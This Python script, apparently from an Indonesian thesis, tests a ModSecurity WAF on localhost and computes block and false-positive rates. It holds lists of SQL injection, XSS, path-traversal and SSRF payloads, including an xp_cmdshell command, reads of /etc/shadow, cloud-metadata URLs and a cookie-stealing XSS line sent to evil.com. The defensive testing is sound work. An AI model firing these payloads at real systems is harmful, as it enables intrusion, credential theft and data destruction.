#!/usr/bin/env python3
"""
=============================================================================
Script Pengujian Keamanan WAF — Fase 4 Evaluasi
Taqiya Nabilla Nathania Afnani — PSSN 2026

Sesuai Proposal TA — Skenario Security Test:
  - SQL Injection (OWASP A03)
  - Cross-Site Scripting / XSS (OWASP A03)
  - Path Traversal / LFI (OWASP A01)
  - SSRF (OWASP A10)
  - HTTP Referer Bypass
  - Web Scraping simulation
  - Hotlinking simulation

Output: hasil.json (untuk kalkulasi ABR, FPR, FNR)
=============================================================================
"""

import sys
import time
import json
import argparse
import statistics
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, quote

# ─── Konfigurasi target ───────────────────────────────────────────────────────
DEFAULT_TARGET = "http://localhost"
TIMEOUT        = 5  # detik


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD DEFINITIONS
# Sesuai skenario pengujian Fase 4 Proposal TA
# ─────────────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL, username, password FROM users --",
    "1; DROP TABLE users --",
    "' OR 1=1 LIMIT 1 --",
    "admin'--",
    "' OR 'x'='x",
    "1' AND SLEEP(5) --",
    "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects)) --",
    "'; EXEC xp_cmdshell('whoami') --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<input type=\"text\" value=\"\"><script>alert('XSS')</script>",
    "%3cscript%3ealert('XSS')%3c%2fscript%3e",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "file:///etc/passwd",
    "....\\....\\....\\windows\\win.ini",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:22",
    "http://localhost:3306",
    "http://[::1]:80",
    "http://0177.0.0.1/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:9200/_cat/indices",
]

REFERER_BYPASS_PAYLOADS = [
    # (Referer header value, X-Forwarded-Host value)
    ("http://evil.com/attack", None),
    ("http://evil.com/", None),
    ("", None),                                    # Empty referer
    ("http://app1.local.evil.com/", None),         # Subdomain trick
    ("http://evil.com/app1.local", None),          # Path trick
    ("http://app1.local%00.evil.com/", None),      # Null byte
    (None, "evil.com"),                            # X-Forwarded-Host
    ("http://app1.local@evil.com/", None),         # @ trick
    ("http://evil.com#app1.local", None),          # Fragment trick
    ("http://xn--app1-qua.local.evil.com/", None), # Punycode
]

SCRAPING_UA_PAYLOADS = [
    "Scrapy/2.11 (+https://scrapy.org)",
    "python-requests/2.31.0",
    "curl/8.4.0",
    "wget/1.21.4",
    "Go-http-client/1.1",
    "libwww-perl/6.77",
    "",                                 # Empty User-Agent
    "a",                                # Terlalu pendek
    "python-urllib3/2.1.0",
    "HTTPie/3.2.2",
]

HOTLINK_REFERERS = [
    ("http://evil.com/steal.html",     "/static/img/logo.png"),
    ("http://competitor.com/",         "/static/img/banner.jpg"),
    ("http://pirates.net/embed",       "/media/video.mp4"),
    ("http://leech.io/",               "/uploads/document.pdf"),
    ("http://192.168.1.100/bad",       "/static/img/logo.png"),
    ("http://app1.local.evil.com/",    "/static/img/logo.png"),
]

LEGITIMATE_REQUESTS = [
    ("GET",  "/",                    {},  {}),
    ("GET",  "/api/products",        {},  {"Referer": "http://app1.local/shop", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}),
    ("GET",  "/api/users",           {},  {"Referer": "http://app1.local/admin", "User-Agent": "Mozilla/5.0"}),
    ("POST", "/comments",            {"text": "Komentar normal"}, {"Referer": "http://app1.local/post/1", "User-Agent": "Mozilla/5.0", "Accept-Language": "id-ID", "Content-Type": "application/json"}),
    ("GET",  "/static/img/logo.png", {},  {"Referer": "http://app1.local/", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}),
    ("GET",  "/health",              {},  {"User-Agent": "HealthCheck/1.0"}),
]


# ─────────────────────────────────────────────────────────────────────────────
# HTTP REQUEST HELPER
# ─────────────────────────────────────────────────────────────────────────────

def send_request(target: str, method: str, path: str,
                 params: dict | None = None,
                 headers: dict | None = None,
                 body: dict | None = None) -> dict:
    """
    Kirim satu HTTP request dan catat hasilnya.
    Return: {status, blocked, response_time_ms, error}
    """
    url = target.rstrip("/") + path
    if params:
        url += "?" + urlencode(params)

    hdrs = {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept":          "text/html,application/json,*/*",
        "Accept-Language": "id-ID,id;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "keep-alive",
    }
    if headers:
        hdrs.update(headers)

    data = None
    if body:
        data = json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"

    req = Request(url, data=data, headers=hdrs, method=method)
    t0  = time.time()
    try:
        with urlopen(req, timeout=TIMEOUT) as resp:
            rt_ms  = (time.time() - t0) * 1000
            status = resp.status
            return {"status": status, "blocked": False, "response_time_ms": round(rt_ms, 2), "error": None}
    except HTTPError as e:
        rt_ms = (time.time() - t0) * 1000
        blocked = e.code in (403, 429, 400)
        return {"status": e.code, "blocked": blocked, "response_time_ms": round(rt_ms, 2), "error": str(e)}
    except URLError as e:
        return {"status": 0, "blocked": False, "response_time_ms": 0, "error": str(e)}
    except Exception as e:
        return {"status": 0, "blocked": False, "response_time_ms": 0, "error": str(e)}


# ─────────────────────────────────────────────────────────────────────────────
# TEST RUNNERS
# ─────────────────────────────────────────────────────────────────────────────

def test_sqli(target: str) -> list[dict]:
    """Pengujian SQL Injection — OWASP A03."""
    print("\n[*] Testing SQL Injection...")
    results = []
    for payload in SQLI_PAYLOADS:
        r = send_request(target, "GET", "/api/search", params={"q": payload})
        r.update({"test": "SQLi", "payload": payload[:60]})
        results.append(r)
        status_icon = "BLOCKED" if r["blocked"] else "PASSED"
        print(f"  [{status_icon}] {payload[:50]:<50} → {r['status']} ({r['response_time_ms']} ms)")
        time.sleep(0.1)
    return results


def test_xss(target: str) -> list[dict]:
    """Pengujian Cross-Site Scripting — OWASP A03."""
    print("\n[*] Testing XSS...")
    results = []
    for payload in XSS_PAYLOADS:
        r = send_request(target, "POST", "/comments",
                        body={"text": payload},
                        headers={"Referer": f"{target}/post/1", "Accept-Language": "id-ID"})
        r.update({"test": "XSS", "payload": payload[:60]})
        results.append(r)
        status_icon = "BLOCKED" if r["blocked"] else "PASSED"
        print(f"  [{status_icon}] {payload[:50]:<50} → {r['status']}")
        time.sleep(0.1)
    return results


def test_lfi(target: str) -> list[dict]:
    """Pengujian Path Traversal / LFI — OWASP A01."""
    print("\n[*] Testing Path Traversal / LFI...")
    results = []
    for payload in LFI_PAYLOADS:
        r = send_request(target, "GET", "/files", params={"name": payload})
        r.update({"test": "LFI", "payload": payload[:60]})
        results.append(r)
        status_icon = "BLOCKED" if r["blocked"] else "PASSED"
        print(f"  [{status_icon}] {payload[:50]:<50} → {r['status']}")
        time.sleep(0.1)
    return results


def test_ssrf(target: str) -> list[dict]:
    """Pengujian SSRF — OWASP A10."""
    print("\n[*] Testing SSRF...")
    results = []
    for payload in SSRF_PAYLOADS:
        r = send_request(target, "POST", "/fetch",
                        body={"url": payload},
                        headers={"Referer": f"{target}/tools", "Accept-Language": "id-ID"})
        r.update({"test": "SSRF", "payload": payload[:60]})
        results.append(r)
        status_icon = "BLOCKED" if r["blocked"] else "PASSED"
        print(f"  [{status_icon}] {payload[:50]:<50} → {r['status']}")
        time.sleep(0.1)
    return results


def test_referer_bypass(target: str) -> list[dict]:
    """Pengujian HTTP Referer Bypass — Custom Rule 1000."""
    print("\n[*] Testing HTTP Referer Bypass...")
    results = []
    for referer, x_fwd_host in REFERER_BYPASS_PAYLOADS:
        hdrs = {"Accept-Language": "id-ID", "User-Agent": "Mozilla/5.0"}
        if referer is not None:
            hdrs["Referer"] = referer
        if x_fwd_host:
            hdrs["X-Forwarded-Host"] = x_fwd_host

        r = send_request(target, "GET", "/api/users", headers=hdrs)
        payload_desc = f"Referer={referer or '(empty)'}" + (f", X-Fwd-Host={x_fwd_host}" if x_fwd_host else "")
        r.update({"test": "RefererBypass", "payload": payload_desc[:80]})
        results.append(r)
        status_icon = "BLOCKED" if r["blocked"] else "PASSED"
        print(f"  [{status_icon}] {payload_desc[:60]:<60} → {r['status']}")
        time.sleep(0.1)
    return results


def test_anti_scraping(target: str) -> list[dict]:
    """Pengujian Anti Web Scraping — Custom Rule 1001."""
    print("\n[*] Testing Anti-Scraping (User-Agent detection)...")
    results = []
    for ua in SCRAPING_UA_PAYLOADS:
        hdrs = {}
        if ua:
            hdrs["User-Agent"] = ua
        r = send_request(target, "GET", "/api/products", headers=hdrs)
        r.update({"test": "AntiScraping", "payload": ua[:60] or "(empty)"})
        results.append(r)
        status_icon = "BLOCKED" if r["blocked"] else "PASSED"
        print(f"  [{status_icon}] UA={ua[:50] or '(empty)':<50} → {r['status']}")
        time.sleep(0.15)
    return results


def test_hotlinking(target: str) -> list[dict]:
    """Pengujian Anti-Hotlinking — Custom Rule 1002."""
    print("\n[*] Testing Anti-Hotlinking...")
    results = []
    for referer, path in HOTLINK_REFERERS:
        r = send_request(target, "GET", path,
                        headers={"Referer": referer, "User-Agent": "Mozilla/5.0"})
        r.update({"test": "Hotlinking", "payload": f"Referer={referer} → {path}"})
        results.append(r)
        status_icon = "BLOCKED" if r["blocked"] else "PASSED"
        print(f"  [{status_icon}] {referer:<40} → {path} ({r['status']})")
        time.sleep(0.1)
    return results


def test_legitimate(target: str) -> list[dict]:
    """
    Pengujian request SAH — untuk mengukur False Positive Rate (FPR).
    Request ini SEHARUSNYA tidak diblokir.
    """
    print("\n[*] Testing Legitimate Requests (untuk FPR)...")
    results = []
    for method, path, body, headers in LEGITIMATE_REQUESTS:
        r = send_request(target, method, path,
                        body=body if body else None,
                        headers=headers)
        r.update({"test": "Legitimate", "payload": f"{method} {path}"})
        results.append(r)
        # Untuk request sah: blocked = FALSE POSITIVE
        fp = "FALSE POSITIVE" if r["blocked"] else "OK (allowed)"
        print(f"  [{fp}] {method} {path:<35} → {r['status']}")
        time.sleep(0.1)
    return results


# ─────────────────────────────────────────────────────────────────────────────
# METRICS CALCULATION
# Sesuai rumus Proposal TA
# ─────────────────────────────────────────────────────────────────────────────

def calculate_metrics(all_results: list[dict]) -> dict:
    """
    Hitung ABR, FPR, FNR, Throughput, Response Time.

    Klasifikasi:
      - Test != 'Legitimate' → ATTACK
      - Test == 'Legitimate' → LEGIT
    """
    attacks = [r for r in all_results if r["test"] != "Legitimate"]
    legits  = [r for r in all_results if r["test"] == "Legitimate"]

    # ─── ABR: Attack Block Rate ───────────────────────────────────────────────
    attacks_total   = len(attacks)
    attacks_blocked = sum(1 for r in attacks if r["blocked"])
    attacks_passed  = attacks_total - attacks_blocked  # False Negatives
    abr = (attacks_blocked / attacks_total * 100) if attacks_total > 0 else 0.0

    # ─── FPR: False Positive Rate ─────────────────────────────────────────────
    legit_total   = len(legits)
    legit_blocked = sum(1 for r in legits if r["blocked"])  # FP
    legit_passed  = legit_total - legit_blocked
    fpr = (legit_blocked / legit_total * 100) if legit_total > 0 else 0.0

    # ─── FNR: False Negative Rate ─────────────────────────────────────────────
    fnr = (attacks_passed / attacks_total * 100) if attacks_total > 0 else 0.0

    # ─── Response Time ────────────────────────────────────────────────────────
    rt_all = [r["response_time_ms"] for r in all_results if r["response_time_ms"] > 0]
    if rt_all:
        rt_sorted = sorted(rt_all)
        rt_mean   = statistics.mean(rt_all)
        rt_p95    = rt_sorted[int(len(rt_sorted) * 0.95)]
        rt_p99    = rt_sorted[int(len(rt_sorted) * 0.99)]
    else:
        rt_mean = rt_p95 = rt_p99 = 0.0

    # ─── Per-test breakdown ───────────────────────────────────────────────────
    test_types = set(r["test"] for r in all_results)
    breakdown  = {}
    for tt in test_types:
        subset      = [r for r in all_results if r["test"] == tt]
        total_s     = len(subset)
        blocked_s   = sum(1 for r in subset if r["blocked"])
        if tt == "Legitimate":
            # FP untuk legitimate
            breakdown[tt] = {
                "total":   total_s,
                "blocked": blocked_s,
                "passed":  total_s - blocked_s,
                "fpr":     round(blocked_s / total_s * 100, 2) if total_s > 0 else 0.0,
            }
        else:
            # ABR per attack type
            breakdown[tt] = {
                "total":   total_s,
                "blocked": blocked_s,
                "passed":  total_s - blocked_s,
                "abr":     round(blocked_s / total_s * 100, 2) if total_s > 0 else 0.0,
            }

    return {
        "summary": {
            "total_requests":    len(all_results),
            "attacks_total":     attacks_total,
            "attacks_blocked":   attacks_blocked,
            "attacks_passed_fn": attacks_passed,
            "legit_total":       legit_total,
            "legit_blocked_fp":  legit_blocked,
            "legit_passed":      legit_passed,
            "abr":  round(abr, 2),
            "fpr":  round(fpr, 2),
            "fnr":  round(fnr, 2),
            "response_time_mean_ms": round(rt_mean, 2),
            "response_time_p95_ms":  round(rt_p95, 2),
            "response_time_p99_ms":  round(rt_p99, 2),
        },
        "breakdown": breakdown,
    }


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║          WAF Security Testing Script — Fase 4 Evaluasi          ║
║          Taqiya Nabilla Nathania Afnani — PSSN 2026             ║
║          Proposal TA: WAF ModSecurity + Nginx                   ║
╚══════════════════════════════════════════════════════════════════╝
""")


def print_results(metrics: dict):
    s = metrics["summary"]
    print("\n" + "="*70)
    print("HASIL PENGUJIAN — METRIK EVALUASI")
    print("="*70)
    print(f"  Total Request         : {s['total_requests']}")
    print(f"  Attack Requests       : {s['attacks_total']}")
    print(f"  Legitimate Requests   : {s['legit_total']}")
    print()
    print(f"  ┌─────────────────────────────────────────────┐")
    print(f"  │ ABR (Attack Block Rate)  : {s['abr']:>6.2f}%          │")
    print(f"  │ FPR (False Positive Rate): {s['fpr']:>6.2f}%          │")
    print(f"  │ FNR (False Negative Rate): {s['fnr']:>6.2f}%          │")
    print(f"  ├─────────────────────────────────────────────┤")
    print(f"  │ Response Time Mean : {s['response_time_mean_ms']:>8.2f} ms        │")
    print(f"  │ Response Time P95  : {s['response_time_p95_ms']:>8.2f} ms        │")
    print(f"  │ Response Time P99  : {s['response_time_p99_ms']:>8.2f} ms        │")
    print(f"  └─────────────────────────────────────────────┘")
    print()
    print("  Per-Attack Breakdown:")
    for test_type, data in metrics["breakdown"].items():
        if test_type == "Legitimate":
            print(f"    {test_type:<20}: FPR = {data['fpr']:>5.1f}%  ({data['blocked']}/{data['total']} blocked)")
        else:
            print(f"    {test_type:<20}: ABR = {data['abr']:>5.1f}%  ({data['blocked']}/{data['total']} blocked)")
    print("="*70)


def main():
    parser = argparse.ArgumentParser(description="WAF Security Testing — PSSN 2026")
    parser.add_argument("--target", default=DEFAULT_TARGET,
                        help=f"Target WAF URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--output", default="hasil_pengujian.json",
                        help="Output file JSON")
    parser.add_argument("--test", default="all",
                        choices=["all", "sqli", "xss", "lfi", "ssrf",
                                 "referer", "scraping", "hotlink", "legit"],
                        help="Pilih jenis pengujian")
    args = parser.parse_args()

    print_banner()
    print(f"Target WAF : {args.target}")
    print(f"Output     : {args.output}")
    print(f"Waktu mulai: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    all_results = []
    test_map = {
        "sqli":     test_sqli,
        "xss":      test_xss,
        "lfi":      test_lfi,
        "ssrf":     test_ssrf,
        "referer":  test_referer_bypass,
        "scraping": test_anti_scraping,
        "hotlink":  test_hotlinking,
        "legit":    test_legitimate,
    }

    if args.test == "all":
        for fn in test_map.values():
            all_results.extend(fn(args.target))
    else:
        all_results = test_map[args.test](args.target)

    # Hitung metrik
    metrics = calculate_metrics(all_results)
    print_results(metrics)

    # Simpan hasil
    output = {
        "metadata": {
            "target":     args.target,
            "test_type":  args.test,
            "timestamp":  datetime.now().isoformat(),
            "researcher": "Taqiya Nabilla Nathania Afnani — PSSN 2026",
        },
        "metrics":  metrics,
        "raw":      all_results,
    }
    with open(args.output, "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Hasil disimpan ke: {args.output}")
    print(f"[+] Selesai: {datetime.now().strftime('%H:%M:%S')}")


if __name__ == "__main__":
    main()
